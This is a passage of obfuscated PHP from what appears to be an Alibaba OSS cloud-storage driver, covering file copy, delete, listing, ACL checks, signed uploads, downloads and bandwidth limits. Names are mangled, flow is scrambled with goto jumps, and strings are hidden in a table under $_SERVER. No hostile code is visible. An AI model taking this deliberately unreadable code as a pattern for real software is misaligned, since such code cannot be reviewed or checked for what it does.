$Aá‰¬š‹¾¤ = 1; $c„óÀ¸Æå© = 0; $e¼ÍÊéßÔ = array(); goto C²æã§÷Á; FÆêà£˜Ë°: $BÁ‹‹ ŠÔ = array(); if ($BëéÁªÓêÏ = $this->hashMd5($C¼‘îÍŠÄ‘)) { $BÁ‹‹ ŠÔ = array(OSS\OssClient::OSS_HEADERS => array($bÁòÍéô…Â[1186] => $BëéÁªÓêÏ)); } $eßèƒ’Í§Ä = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($CòãåëÖøˆ), $BÁ‹‹ ŠÔ); goto A¼‹á“­•; C²æã§÷Á: $d›ïè¥µÈ = 1024 * 1024 * 10; $eÃ¯İÛªÁ‚ = $this->client->generateMultiuploadParts($C¤³Ä¸éÏ¤, $d›ïè¥µÈ); foreach ($eÃ¯İÛªÁ‚ as $E¯—‹ Ü´ => $DÒÙßŠÄÃ¢) { $EÃ„™Ôæ = $c„óÀ¸Æå© + (int) $DÒÙßŠÄÃ¢[$bÁòÍéô…Â[1187]]; $c®Ù™›Îëì = (int) $DÒÙßŠÄÃ¢[$bÁòÍéô…Â[325]] + $EÃ„™Ôæ - 1; $eôôëÁÛ¬ = array($bÁòÍéô…Â[1188] => $EÃ„™Ôæ, $bÁòÍéô…Â[1189] => $c®Ù™›Îëì); $e¼ÍÊéßÔ[] = $this->client->uploadPartCopy($this->bucket, $C¼‘îÍŠÄ‘, $this->bucket, $this->pathEncode($CòãåëÖøˆ), $Aá‰¬š‹¾¤, $eßèƒ’Í§Ä, $eôôëÁÛ¬); $Aá‰¬š‹¾¤ = $Aá‰¬š‹¾¤ + 1; } goto dˆ¥Ÿäæ‘; cÃôÛàÔ³ù: } catch (OSS\Core\OssException $E•¿™¯‘¹ƒ) { return !1; } return !0; } public function moveFile($cËßÚ­‹Õƒ, $cõ¥—ÆŞ‚Ÿ) { if ($this->copyFile($cËßÚ­‹Õƒ, $cõ¥—ÆŞ‚Ÿ)) { $this->remove($cËßÚ­‹Õƒ); return !0; } return !1; } public function delFile($a¼ª‡·ºø) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($a¼ª‡·ºø)); } catch (OSS\Core\OssException $B¼»«‡³¦¨) { return !1; } return !0; } public function delFolder($Fã¨¾Ğöµ¯) { $CÛïÇßù‘• =& $_SERVER[”Ì÷ñ­î¸]; $eì µÉãòƒ = $this->fileList($Fã¨¾Ğöµ¯); if (!empty($Fã¨¾Ğöµ¯) && !in_array(trim($Fã¨¾Ğöµ¯, $CÛïÇßù‘•[8]) . $CÛïÇßù‘•[8], $eì µÉãòƒ[$CÛïÇßù‘•[73]])) { $eì µÉãòƒ[$CÛïÇßù‘•[73]][] = trim($Fã¨¾Ğöµ¯, $CÛïÇßù‘•[8]) . $CÛïÇßù‘•[8]; } foreach (array_chunk($eì µÉãòƒ[$CÛïÇßù‘•[73]], 1000) as $Aéæˆ„îì) { try { $this->client->deleteObjects($this->bucket, $Aéæˆ„îì); } catch (OSS\Core\OssException $b¶É¼ÆÕ£Å) { continue; } } return !0; } public function rename($d“Ëï‚¶Ø‰, $BÃİó½Ú) { return $this->renameObject($d“Ëï‚¶Ø‰, $BÃİó½Ú); } private function fileInfo($aêËÄ¹©éğ, $eø†ğ ±—’ = array()) { goto dòÈ‚§Ë; B‰„±‚: return $e†¦®ç‹; goto fßì°î°óù; b–‰Š¤åÂ„: if (isset($eø†ğ ±—’[$D—°ÜÂÛÛÇ[77]])) { $e†¦®ç‹[$D—°ÜÂÛÛÇ[77]] = $eø†ğ ±—’[$D—°ÜÂÛÛÇ[77]]; } if (isset($eø†ğ ±—’[$D—°ÜÂÛÛÇ[107]])) { $e†¦®ç‹[$D—°ÜÂÛÛÇ[107]] = $eø†ğ ±—’[$D—°ÜÂÛÛÇ[107]]; } if (isset($eø†ğ ±—’[$D—°ÜÂÛÛÇ[190]]) && !trim($e†¦®ç‹[$D—°ÜÂÛÛÇ[107]])) { $e†¦®ç‹[$D—°ÜÂÛÛÇ[107]] = $eø†ğ ±—’[$D—°ÜÂÛÛÇ[190]]; } goto B‰„±‚; dòÈ‚§Ë: $D—°ÜÂÛÛÇ =& $_SERVER[”Ì÷ñ­î¸]; $e†¦®ç‹ = array($D—°ÜÂÛÛÇ[28] => $this->pathThis($aêËÄ¹©éğ), $D—°ÜÂÛÛÇ[75] => $this->getPathOuter($aêËÄ¹©éğ), $D—°ÜÂÛÛÇ[29] => $D—°ÜÂÛÛÇ[167], $D—°ÜÂÛÛÇ[187] => 0, $D—°ÜÂÛÛÇ[107] => 0, $D—°ÜÂÛÛÇ[77] => 0, $D—°ÜÂÛÛÇ[160] => $this->ext($aêËÄ¹©éğ), $D—°ÜÂÛÛÇ[188] => !0, $D—°ÜÂÛÛÇ[189] => !0); if (empty($eø†ğ ±—’)) { $F­óƒ£ÛÕÂ = $this->objectMeta($aêËÄ¹©éğ); if (!$F­óƒ£ÛÕÂ) { return $e†¦®ç‹; } $eø†ğ ±—’ = array($D—°ÜÂÛÛÇ[107] => strtotime($F­óƒ£ÛÕÂ[$D—°ÜÂÛÛÇ[1192]]), $D—°ÜÂÛÛÇ[77] => $F­óƒ£ÛÕÂ[$D—°ÜÂÛÛÇ[1193]] + 0); } goto b–‰Š¤åÂ„; fßì°î°óù: } private function folderInfo($CÚÑ©·ôóš, $CÂåš¬çó‘ = array()) { $eÖŒ‘ˆß =& $_SERVER[”Ì÷ñ­î¸]; $F­¨Ä®·Èƒ = array($eÖŒ‘ˆß[28] => $this->pathThis($CÚÑ©·ôóš), $eÖŒ‘ˆß[75] => $this->getPathOuter($eÖŒ‘ˆß[8] . $CÚÑ©·ôóš), $eÖŒ‘ˆß[29] => $eÖŒ‘ˆß[76], $eÖŒ‘ˆß[187] => 0, $eÖŒ‘ˆß[107] => 0, $eÖŒ‘ˆß[188] => !0, $eÖŒ‘ˆß[189] => !0); if (empty($CÂåš¬çó‘)) { $CÚÑ©·ôóš = rtrim($CÚÑ©·ôóš, $eÖŒ‘ˆß[8]) . $eÖŒ‘ˆß[8]; $F¶¶”÷Å  = $this->objectMeta($CÚÑ©·ôóš); if (!$F¶¶”÷Å ) { return $F­¨Ä®·Èƒ; } $CÂåš¬çó‘ = array($eÖŒ‘ˆß[187] => $F¶¶”÷Å [$eÖŒ‘ˆß[1194]][$eÖŒ‘ˆß[1195]], $eÖŒ‘ˆß[107] => strtotime($F¶¶”÷Å [$eÖŒ‘ˆß[1192]])); } if (isset($CÂåš¬çó‘[$eÖŒ‘ˆß[107]])) { $F­¨Ä®·Èƒ[$eÖŒ‘ˆß[107]] = $CÂåš¬çó‘[$eÖŒ‘ˆß[107]]; } if (isset($CÂåš¬çó‘[$eÖŒ‘ˆß[187]])) { $F­¨Ä®·Èƒ[$eÖŒ‘ˆß[187]] = $CÂåš¬çó‘[$eÖŒ‘ˆß[187]]; } return $F­¨Ä®·Èƒ; } public function listPath($B…º­Ï±¥Ë, $e–ºØøˆ÷„ = false) { $F†ç®Ïƒ® =& $_SERVER[”Ì÷ñ­î¸]; $d¯ìàµˆ = $this->fileList($B…º­Ï±¥Ë, $F†ç®Ïƒ®[8], !0); foreach ($d¯ìàµˆ[$F†ç®Ïƒ®[74]] as $Fñé‰®Û®À => $Dê§ƒÁ­ƒ¦) { $d¯ìàµˆ[$F†ç®Ïƒ®[74]][$Fñé‰®Û®À] = $this->folderInfo($Dê§ƒÁ­ƒ¦, $Dê§ƒÁ­ƒ¦); } foreach ($d¯ìàµˆ[$F†ç®Ïƒ®[73]] as $Fñé‰®Û®À => $Dê§ƒÁ­ƒ¦) { $d¯ìàµˆ[$F†ç®Ïƒ®[73]][$Fñé‰®Û®À] = $this->fileInfo($Dê§ƒÁ­ƒ¦[$F†ç®Ïƒ®[28]], $Dê§ƒÁ­ƒ¦); } return $d¯ìàµˆ; } public function has($FóŸ§†ÊË¦, $dÚŠÆòÜ‰ = false, $A‰¨ÉÅ‡‹ø = true) { goto Cò¿˜Šù—; cÑ¥œ™‘: $a‚ÁğÌ“‰¬ = $eìİ„¶ğ[33]; $b“Â’Ÿƒ¼ë = 500; $b¥×ÑøÎÔì = 0; goto D¤ºÍìÊ¾‘; eõ—¿é§’‘: return !1; goto bØø¥Ü“­; D¤ºÍìÊ¾‘: $FêùöÜÎ’É = 0; while (!0) { $d¤ÖßÔŸÒò = array($eìİ„¶ğ[1183] => $eìİ„¶ğ[8], $eìİ„¶ğ[186] => $aĞÇåºŸÁç, $eìİ„¶ğ[1184] => $b“Â’Ÿƒ¼ë, $eìİ„¶ğ[1185] => $a‚ÁğÌ“‰¬); try { $aÛËŸÍ¸·Ø = $this->client->listObjects($this->bucket, $d¤ÖßÔŸÒò); } catch (OSS\Core\OssException $dÕ²£ÙõÌ·) { break; } $a‚ÁğÌ“‰¬ = $aÛËŸÍ¸·Ø->getNextMarker(); $A©“òâÓÒˆ = $aÛËŸÍ¸·Ø->getObjectList(); $a‹ŸôÙ¼ = $aÛËŸÍ¸·Ø->getPrefixList(); if ($dÚŠÆòÜ‰) { if (count($A©“òâÓÒˆ) > 1 || count($A©“òâÓÒˆ) == 1 && $A©“òâÓÒˆ[0]->getKey() != $aĞÇåºŸÁç) { $b¥×ÑøÎÔì += count($A©“òâÓÒˆ) - 1; } if (!empty($a‹ŸôÙ¼)) { $FêùöÜÎ’É += count($a‹ŸôÙ¼); } if ($a‚ÁğÌ“‰¬ === $eìİ„¶ğ[33]) { break; } continue; } if ($A‰¨ÉÅ‡‹ø) { if (!empty($A©“òâÓÒˆ)) { if (count($A©“òâÓÒˆ) > 1 || $A©“òâÓÒˆ[0]->getKey() != $aĞÇåºŸÁç) { return !0; } } } else { if (!empty($a‹ŸôÙ¼)) { return !0; } } if ($a‚ÁğÌ“‰¬ === $eìİ„¶ğ[33]) { break; } } if ($dÚŠÆòÜ‰) { return array($eìİ„¶ğ[191] => $b¥×ÑøÎÔì, $eìİ„¶ğ[192] => $FêùöÜÎ’É); } goto eõ—¿é§’‘; Cò¿˜Šù—: $eìİ„¶ğ =& $_SERVER[”Ì÷ñ­î¸]; $FóŸ§†ÊË¦ = trim($FóŸ§†ÊË¦, $eìİ„¶ğ[8]); $aĞÇåºŸÁç = empty($FóŸ§†ÊË¦) ? $eìİ„¶ğ[33] : $FóŸ§†ÊË¦ . $eìİ„¶ğ[8]; goto cÑ¥œ™‘; bØø¥Ü“­: } public function listAll($FÊ±Ô¡µ‘’) { $B‰…äæ¥Èß =& $_SERVER[”Ì÷ñ­î¸]; $BÌ¼½®á = $this->fileList($FÊ±Ô¡µ‘’, $B‰…äæ¥Èß[33], !0); $E“êŸ–Ş = array(); foreach ($BÌ¼½®á[$B‰…äæ¥Èß[73]] as $A©Ë‰ÙÊ) { $E“êŸ–Ş[$A©Ë‰ÙÊ[$B‰…äæ¥Èß[28]]] = $A©Ë‰ÙÊ[$B‰…äæ¥Èß[77]]; } return $this->listAllFiles($FÊ±Ô¡µ‘’, array_keys($E“êŸ–Ş), $E“êŸ–Ş); } public function canRead($CÆ†Ï¯ö¾) { $f‡ç–¶Ã =& $_SERVER[”Ì÷ñ­î¸]; $Aä´ĞÏÀ²â = $this->pathAcl($CÆ†Ï¯ö¾); return $Aä´ĞÏÀ²â == $f‡ç–¶Ã[1196] || $Aä´ĞÏÀ²â == $f‡ç–¶Ã[491] ? !0 : !1; } public function canWrite($a… ÏÒ‘¸Ó) { $Bâ¤„ùÑí‡ = $this->pathAcl($a… ÏÒ‘¸Ó); return $Bâ¤„ùÑí‡ == $_SERVER[”Ì÷ñ­î¸][491] ? !0 : !1; } public function pathAcl($DŒ¸˜ä‰‹ ) { goto Cˆáï÷‹¡‘; c†æ÷­óÈ†: return $B·Ê‰¦‡ Ç; goto Dî–Ö–’¦ˆ; bÎ÷…ğå°: $B·Ê‰¦‡ Ç = $D›ãˆé£Ò == $dÍñğ„İ¥ˆ[34] ? $this->bucketAcl : $D›ãˆé£Ò; if ($B·Ê‰¦‡ Ç == $dÍñğ„İ¥ˆ[1197]) { return $dÍñğ„İ¥ˆ[1196]; } if ($B·Ê‰¦‡ Ç == $dÍñğ„İ¥ˆ[1198]) { return $dÍñğ„İ¥ˆ[491]; } goto c†æ÷­óÈ†; Cˆáï÷‹¡‘: $dÍñğ„İ¥ˆ =& $_SERVER[”Ì÷ñ­î¸]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $D›ãˆé£Ò = $this->client->getObjectAcl($this->bucket, $this->pathEncode($DŒ¸˜ä‰‹ )); } catch (OSS\Core\OssException $eçÕÙÈĞğ) { return !1; } goto bÎ÷…ğå°; Dî–Ö–’¦ˆ: } private function chmodPath($D¶µ³ÔŸµ, $bàÂŒŠå£ = '') { $D…ˆˆÂèÂ– =& $_SERVER[”Ì÷ñ­î¸]; $b¶ÔØªæ¶î = empty($bàÂŒŠå£) ? $D…ˆˆÂèÂ–[1198] : $bàÂŒŠå£; $DçÈÆó’â  = array($D…ˆˆÂèÂ–[34], $D…ˆˆÂèÂ–[185], $D…ˆˆÂèÂ–[1197], $D…ˆˆÂèÂ–[1198]); if (!in_array($b¶ÔØªæ¶î, $DçÈÆó’â )) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($D¶µ³ÔŸµ), $b¶ÔØªæ¶î); } catch (OSS\Core\OssException $f†¦Ò‘‰°) { return !1; } return !0; } public function getContent($E»… Ç©ª) { return $this->fileSubstr($E»… Ç©ª, -1); } public function setContent($E„¸Ì°Ü·÷, $A–ÆáõÊ„ğ = '') { $AÚœ¼Ÿî­Û =& $_SERVER[”Ì÷ñ­î¸]; try { $EÌÊöñ°ƒ÷ = $this->trafficLimit($AÚœ¼Ÿî­Û[1199]); $a×âÚ„á… = $this->client->putObject($this->bucket, $this->pathEncode($E„¸Ì°Ü·÷), $A–ÆáõÊ„ğ, $EÌÊöñ°ƒ÷); } catch (OSS\Core\OssException $E”µ¯Ùµ) { return !1; } $FÛ¿ª†‹Ğ› = array($AÚœ¼Ÿî­Û[1186] => trim($a×âÚ„á…[$AÚœ¼Ÿî­Û[1200]], $AÚœ¼Ÿî­Û[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($E„¸Ì°Ü·÷))); $this->updateObjMeta($E„¸Ì°Ü·÷, $FÛ¿ª†‹Ğ›); return isset($a×âÚ„á…[$AÚœ¼Ÿî­Û[1201]][$AÚœ¼Ÿî­Û[1145]]) ? (int) $a×âÚ„á…[$AÚœ¼Ÿî­Û[1201]][$AÚœ¼Ÿî­Û[1145]] : strlen($a×âÚ„á…); } private function updateObjMeta($D¾Ê¯©½æ, $bªÑ®¸µÙ·) { $D¾Ê¯©½æ = $this->pathEncode($D¾Ê¯©½æ); try { $bñÃÂöõğ = array(OSS\OssClient::OSS_HEADERS => $bªÑ®¸µÙ·); $this->client->copyObject($this->bucket, $D¾Ê¯©½æ, $this->bucket, $D¾Ê¯©½æ, $bñÃÂöõğ); } catch (OSS\Core\OssException $E¤ĞÌÖ’À±) { return !1; } return !0; } public function upload($C½ÒñŞ«óÛ, $CÂŒÚÅÊÇ‹, $bÜŠµÒå = false, $aìßÂ‡¤Ì = REPEAT_REPLACE) { $A–ùÌ³‰½³ =& $_SERVER[”Ì÷ñ­î¸]; $eáÃĞç™† = trim($C½ÒñŞ«óÛ, $A–ùÌ³‰½³[8]); $e—¡Ê›Ö‰Ú = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($A–ùÌ³‰½³[1186] => @md5_file($CÂŒÚÅÊÇ‹)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($C½ÒñŞ«óÛ))); $e—¡Ê›Ö‰Ú = $this->trafficLimit($A–ùÌ³‰½³[1199], $e—¡Ê›Ö‰Ú); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($eáÃĞç™†), $CÂŒÚÅÊÇ‹, $e—¡Ê›Ö‰Ú); } catch (OSS\Core\OssException $E¬ÜöÀ¥°‚) { return !1; } return $this->getPathOuter($C½ÒñŞ«óÛ); } public function getHost() { $b…Šï¿æÔÕ =& $_SERVER[”Ì÷ñ­î¸]; $b™­õ£ŸÅÍ = explode($b…Šï¿æÔÕ[171], parent::getHost()); return $b™­õ£ŸÅÍ[0] . $b…Šï¿æÔÕ[171] . $this->bucket . $b…Šï¿æÔÕ[91] . $b™­õ£ŸÅÍ[1]; } public function uploadFormData($F½Í…›ƒ·‹, $B©óÂÓ´®É = 3600) { goto b©ç»†Åˆä; E¢ÂÚ ¿½å: return $CÊó×ŸÄ‘ğ; goto bİÓÑê³Ê; cÓ‚ù”‰§Æ: $CËí’é‚ß = $this->pathFather($F½Í…›ƒ·‹); $c²Š¨æŠÖÂ = array($fáï¯‚òÁ[1102] => $b¸ìÕÖ¨ò, $fáï¯‚òÁ[1103] => array(array($fáï¯‚òÁ[1204], 0, $c´…ò‰•ñã), array($fáï¯‚òÁ[1106], $fáï¯‚òÁ[1107], $CËí’é‚ß))); $D†ĞŠÂãÏ… = base64_encode(json_encode($c²Š¨æŠÖÂ)); goto a®ÎÒ¦œóÜ; a®ÎÒ¦œóÜ: $Eèß–¢îÊ½ = base64_encode(hash_hmac($fáï¯‚òÁ[218], $D†ĞŠÂãÏ…, $this->secret, !0)); $CÊó×ŸÄ‘ğ = array($fáï¯‚òÁ[1112] => $D†ĞŠÂãÏ…, $fáï¯‚òÁ[1205] => $this->accessKey, $fáï¯‚òÁ[1108] => $fáï¯‚òÁ[1100], $fáï¯‚òÁ[1206] => $Eèß–¢îÊ½, $fáï¯‚òÁ[169] => $E‰à‰®¡Ä); $CÊó×ŸÄ‘ğ = $this->trafficLimit($fáï¯‚òÁ[1199], $CÊó×ŸÄ‘ğ); goto E¢ÂÚ ¿½å; FÈŠŒÕù‡é: $AÊÔŸ¹Æâö = date($fáï¯‚òÁ[1202], time() + $f¬ëÍËŒ×¶); $F³Ä§‚ó²Ú = new DateTime($AÊÔŸ¹Æâö); $b¸ìÕÖ¨ò = $F³Ä§‚ó²Ú->format(DateTime::ISO8601); goto d±ÀäºœçÆ; b©ç»†Åˆä: $fáï¯‚òÁ =& $_SERVER[”Ì÷ñ­î¸]; if (!($E‰à‰®¡Ä = $this->getHost())) { return !1; } $f¬ëÍËŒ×¶ = $B©óÂÓ´®É; goto FÈŠŒÕù‡é; d±ÀäºœçÆ: $B”Óƒ…í£ñ = strpos($b¸ìÕÖ¨ò, $fáï¯‚òÁ[284]); $b¸ìÕÖ¨ò = substr($b¸ìÕÖ¨ò, 0, $B”Óƒ…í£ñ) . $fáï¯‚òÁ[1203]; $c´…ò‰•ñã = 1048576000 * 5; goto cÓ‚ù”‰§Æ; bİÓÑê³Ê: } public function multiUploadFormData($D©Ÿã‡ìèæ, $CßÉŞİƒ´ = 3600) { $aœ·ÉÀ¾øÔ =& $_SERVER[”Ì÷ñ­î¸]; if (!($dÉˆ„¿µé’ = $this->getHost())) { return !1; } $c«¡ÙóÓŸÎ = $this->trafficLimit($aœ·ÉÀ¾øÔ[1199]); $aÙ…ó‡´ª® = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($D©Ÿã‡ìèæ), $c«¡ÙóÓŸÎ); return array($aœ·ÉÀ¾øÔ[209] => $aÙ…ó‡´ª®, $aœ·ÉÀ¾øÔ[169] => $dÉˆ„¿µé’ . $aœ·ÉÀ¾øÔ[8] . $this->pathEncode($D©Ÿã‡ìèæ), $aœ·ÉÀ¾øÔ[210] => gmdate($aœ·ÉÀ¾øÔ[1207]), $aœ·ÉÀ¾øÔ[89] => $D©Ÿã‡ìèæ); } public function multiUploadAuthData($Eäƒ¬Š ¼¯, $FÅ¶˜¼ÇĞÒ = array()) { goto EˆÓÇ²ˆ; ağåÈÇ¢—º: $F·´‚‰  = $Eäƒ¬Š ¼¯; if (isset($FÅ¶˜¼ÇĞÒ[$B•öÎ¯ïÇÇ[89]])) { $F·´‚‰  = $FÅ¶˜¼ÇĞÒ[$B•öÎ¯ïÇÇ[89]]; unset($FÅ¶˜¼ÇĞÒ[$B•öÎ¯ïÇÇ[89]]); } if (isset($FÅ¶˜¼ÇĞÒ[$B•öÎ¯ïÇÇ[211]])) { $FÅ¶˜¼ÇĞÒ[$B•öÎ¯ïÇÇ[210]] = $e¿–ßÚÆŒä; return $this->listUploadParts($F·´‚‰ , $FÅ¶˜¼ÇĞÒ); } goto aµøÇƒ»àæ; EˆÓÇ²ˆ: $B•öÎ¯ïÇÇ =& $_SERVER[”Ì÷ñ­î¸]; $e¿–ßÚÆŒä = isset($FÅ¶˜¼ÇĞÒ[$B•öÎ¯ïÇÇ[210]]) ? $FÅ¶˜¼ÇĞÒ[$B•öÎ¯ïÇÇ[210]] : gmdate($B•öÎ¯ïÇÇ[1207]); $D‡ğÛ„–§« = isset($FÅ¶˜¼ÇĞÒ[$B•öÎ¯ïÇÇ[160]]) ? $FÅ¶˜¼ÇĞÒ[$B•öÎ¯ïÇÇ[160]] : $B•öÎ¯ïÇÇ[33]; goto ağåÈÇ¢—º; aµøÇƒ»àæ: $EÆğÒÂÌ­ã = array($B•öÎ¯ïÇÇ[212], $B•öÎ¯ïÇÇ[33], $B•öÎ¯ïÇÇ[116], $e¿–ßÚÆŒä, "\x78\x2d\x6f\x73\163\x2d\x64\141\164\145\72{$e¿–ßÚÆŒä}", $B•öÎ¯ïÇÇ[8] . $this->bucket . $B•öÎ¯ïÇÇ[8] . $F·´‚‰  . $D‡ğÛ„–§«); if (strpos($D‡ğÛ„–§«, $B•öÎ¯ïÇÇ[213]) === 0) { $EÆğÒÂÌ­ã[0] = $B•öÎ¯ïÇÇ[214]; if ($Dñéƒ¥—  = $this->trafficLimit($B•öÎ¯ïÇÇ[1199])) { $F·´‚‰  = $B•öÎ¯ïÇÇ[1208]; array_splice($EÆğÒÂÌ­ã, 5, 0, $F·´‚‰  . $B•öÎ¯ïÇÇ[4] . $Dñéƒ¥— [$F·´‚‰ ]); } } if (isset($FÅ¶˜¼ÇĞÒ[$B•öÎ¯ïÇÇ[215]]) && $FÅ¶˜¼ÇĞÒ[$B•öÎ¯ïÇÇ[215]] == $B•öÎ¯ïÇÇ[216]) { $EÆğÒÂÌ­ã[0] = $B•öÎ¯ïÇÇ[216]; } goto eƒñÎ’Æ¦Í; eƒñÎ’Æ¦Í: if (!empty($FÅ¶˜¼ÇĞÒ[$B•öÎ¯ïÇÇ[1209]])) { $fÁ‰İàçÁ = array_merge(array($EÆğÒÂÌ­ã[4]), $FÅ¶˜¼ÇĞÒ[$B•öÎ¯ïÇÇ[1209]]); sort($fÁ‰İàçÁ); $EÆğÒÂÌ­ã[4] = implode($B•öÎ¯ïÇÇ[217], $fÁ‰İàçÁ); } $A‡¤Ø¥Ê¥ñ = implode($B•öÎ¯ïÇÇ[217], $EÆğÒÂÌ­ã); $f‚ÓÕ»Èà = base64_encode(hash_hmac($B•öÎ¯ïÇÇ[218], $A‡¤Ø¥Ê¥ñ, $this->secret, !0)); goto CèóÃéßë; CèóÃéßë: $eƒåÂ¼—™ = $B•öÎ¯ïÇÇ[1210] . $this->accessKey . $B•öÎ¯ïÇÇ[4] . $f‚ÓÕ»Èà; if (strpos($D‡ğÛ„–§«, $B•öÎ¯ïÇÇ[213]) === 0) { $eƒåÂ¼—™ = array($B•öÎ¯ïÇÇ[220] => $eƒåÂ¼—™, $B•öÎ¯ïÇÇ[210] => $e¿–ßÚÆŒä); if ($Dñéƒ¥— ) { $eƒåÂ¼—™ = array_merge($eƒåÂ¼—™, $Dñéƒ¥— ); } } return $eƒåÂ¼—™; goto CÅŠ‹®¹Í‰; CÅŠ‹®¹Í‰: } public function listUploadParts($E¾¡’¶Á, $eŞ¹¨âß·Î) { goto AÅÏšğ¡‡£; AÅÏšğ¡‡£: $Eö´ªàÃ¿ò =& $_SERVER[”Ì÷ñ­î¸]; $EõÕŞå½ = parse_url_query($eŞ¹¨âß·Î[$Eö´ªàÃ¿ò[160]]); $f÷‰ÅØøÎŒ = $this->client->listParts($this->bucket, $this->pathEncode($E¾¡’¶Á), $EõÕŞå½[$Eö´ªàÃ¿ò[209]]); goto D¦ÂÆİÚ‘Ô; dæØ¡ø×£™: unset($eŞ¹¨âß·Î[$Eö´ªàÃ¿ò[211]], $eŞ¹¨âß·Î[$Eö´ªàÃ¿ò[215]]); $a‰å¶É” = $this->multiUploadAuthData($E¾¡’¶Á, $eŞ¹¨âß·Î); if (empty($a‰å¶É”)) { return !1; } goto dÀÛùòß·›; D¦ÂÆİÚ‘Ô: $Cóšİ¯İ²½ = $f÷‰ÅØøÎŒ->getListPart(); $a‘¡…Óçô = array(); foreach ($Cóšİ¯İ²½ as $få÷çµ½ÕÁ) { $a‘¡…Óçô[] = array($Eö´ªàÃ¿ò[1190] => $få÷çµ½ÕÁ->getPartNumber(), $Eö´ªàÃ¿ò[1191] => trim($få÷çµ½ÕÁ->getETag(), $Eö´ªàÃ¿ò[113])); } goto dæØ¡ø×£™; dÀÛùòß·›: return array($Eö´ªàÃ¿ò[220] => $a‰å¶É”, $Eö´ªàÃ¿ò[210] => $eŞ¹¨âß·Î[$Eö´ªàÃ¿ò[210]], $Eö´ªàÃ¿ò[222] => $a‘¡…Óçô); goto e²ğĞÕò±¼; e²ğĞÕò±¼: } public function download($fëåéŸ”ğÙ, $d¾Õ¨Ü‰’Ÿ) { if ($this->isFolder($fëåéŸ”ğÙ)) { return !1; } try { $FÂˆº‚‚¥ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $d¾Õ¨Ü‰’Ÿ); $FÂˆº‚‚¥ = $this->trafficLimit($_SERVER[”Ì÷ñ­î¸][105], $FÂˆº‚‚¥); $this->client->getObject($this->bucket, $this->pathEncode($fëåéŸ”ğÙ), $FÂˆº‚‚¥); } catch (OSS\Core\OssException $a¯Ëˆ±É•ó) { return !1; } return $d¾Õ¨Ü‰’Ÿ; } public function fileSubstr($Eİå¤¼ºò, $AÌÕ‚š›¸ = 0, $cÊå­‡¤Ù¤ = false) { if ($AÌÕ‚š›¸ === -1) { $CÌî‰‚‚õ… = array(); } else { if ($cÊå­‡¤Ù¤ === !1) { $fáâÌ‡”º’ = $this->size($Eİå¤¼ºò); } else { $fáâÌ‡”º’ = $AÌÕ‚š›¸ + $cÊå­‡¤Ù¤ - 1; } $CÌî‰‚‚õ… = array(OSS\OssClient::OSS_RANGE => "{$AÌÕ‚š›¸}\x2d{$fáâÌ‡”º’}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Eİå¤¼ºò), $CÌî‰‚‚õ…); } catch (OSS\Core\OssException $cÒß‚¨”ìÏ) { think_exception($cÒß‚¨”ìÏ->getMessage()); return !1; } } private function trafficLimit($fé‰×¹¶, $DÂ‰ğ£šøò = array()) { goto Aã¸ôõŒĞ¥; Aã¸ôõŒĞ¥: $Bí¬¾æ»„è =& $_SERVER[”Ì÷ñ­î¸]; if ($fé‰×¹¶ == $Bí¬¾æ»„è[1199] && $this->isUploadServer() || $fé‰×¹¶ == $Bí¬¾æ»„è[105] && $this->isFileOutServer()) { return $DÂ‰ğ£šøò; } $F±œ³èáÁÈ = floatval($GLOBALS[$Bí¬¾æ»„è[6]][$Bí¬¾æ»„è[84]][$Bí¬¾æ»„è[103]][$fé‰×¹¶]) * 1024 * 1024 * 8; goto f¿ÇØ‡Ÿ»; a„õï±‘ññ: return $DÂ‰ğ£šøò; goto A«Î¹ï„³; f¿ÇØ‡Ÿ»: if (!$F±œ³èáÁÈ) { return $DÂ‰ğ£šøò; } $F±œ³èáÁÈ = $F±œ³èáÁÈ < 819200 ? 819200 : ($F±œ³èáÁÈ > 838860800 ? 838860800 : $F±œ³èáÁÈ); $DÂ‰ğ£šøò[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($F±œ³èáÁÈ); goto a„õï±‘ññ; A«Î¹ï„³: } public function link($Aœ‚İÄÖã÷, $a„ÕªÌ§» = array()) { $FĞñ•íùâÉ =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->exist($Aœ‚İÄÖã÷) || $this->isFolder($Aœ‚İÄÖã÷)) { return !1; } try { $a„ÕªÌ§» = $this->trafficLimit($FĞñ•íùâÉ[105], $a„ÕªÌ§»); $fÓöíÙôâ = $this->client->signUrl($this->bucket, $this->pathEncode($Aœ‚İÄÖã÷), 3600 * 12, $FĞñ•íùâÉ[216], $a„ÕªÌ§»); return $this->getCdnLink($fÓöíÙôâ); } catch (OSS\Core\OssException $E‘ïë¼‚Éò) { return !1; } } public function fileOut($F›ùÄé¥Ùñ, $a³œÍ…¯·­ = false, $C’±¢µöİ÷ = false, $e¿Û¼šæ± = '') { goto BÄ³³‰ÕàÅ; Bø³áÇÏ©î: $aÜ“¾”ÙÀ = get_file_mime(get_path_ext($C’±¢µöİ÷)); if ($aÜ“¾”ÙÀ == $aø¿×¼Šˆ[201]) { return parent::fileOut($F›ùÄé¥Ùñ, $a³œÍ…¯·­, $C’±¢µöİ÷, $e¿Û¼šæ±); } $a³œÍ…¯·­ = $a³œÍ…¯·­ ? $aø¿×¼Šˆ[202] : $aø¿×¼Šˆ[203]; goto f¹„°ò…À; BÄ³³‰ÕàÅ: $aø¿×¼Šˆ =& $_SERVER[”Ì÷ñ­î¸]; if (!$C’±¢µöİ÷) { $C’±¢µöİ÷ = $this->pathThis($F›ùÄé¥Ùñ); } $C’±¢µöİ÷ = rawurlencode($C’±¢µöİ÷); goto Bø³áÇÏ©î; C†½ğ ¾: $this->fileOutLink($Eõ±ÎöÏ´æ); goto aóÕŒ‡†”; f¹„°ò…À: $eÕ‰¬ô×‘ = array(OSS\OssClient::OSS_SUB_RESOURCE => 